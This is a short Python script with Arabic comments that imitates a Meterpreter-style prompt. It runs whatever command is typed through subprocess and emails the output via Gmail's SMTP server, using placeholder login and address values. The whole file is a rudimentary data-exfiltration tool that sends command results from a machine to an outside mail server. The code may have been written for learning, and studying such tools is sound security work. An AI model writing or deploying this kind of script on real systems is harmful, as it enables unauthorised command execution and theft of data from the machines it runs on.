from smtplib import SMTP
from subprocess import check_output
server =SMTP('smtp.gmail.com' , 587)
server.starttls() #turn on TLSالنقل الآمن
server.login('USER' , 'PASSWORD')
command=input("Meterpreter=>> ")
msg= check_output(command)# الامر هنا  هيتنفز في الترمينال او السي ام دى
server.sendmail("from_address" , "to_addrs" , msg) #ناتج الامر هيتبعت ع الميل
server.quit()